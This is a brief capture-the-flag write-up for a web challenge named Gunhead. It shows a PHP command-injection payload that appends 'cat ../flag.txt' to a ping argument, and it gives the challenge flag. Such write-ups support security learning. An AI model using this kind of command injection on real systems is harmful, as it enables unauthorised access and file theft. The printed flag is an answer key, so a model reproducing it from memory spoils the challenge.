# Gunhead (WEB)

Description: During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

## Writeup

After checking the source file, I can see there is command injection in PHP code.
Check it out!

![abc](https://i.imgur.com/7ebZTtM.png)

Payload: /ping 127.0.0.1; cat ../flag.txt

And boom, we get our flag.

## Flag:

`HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}`
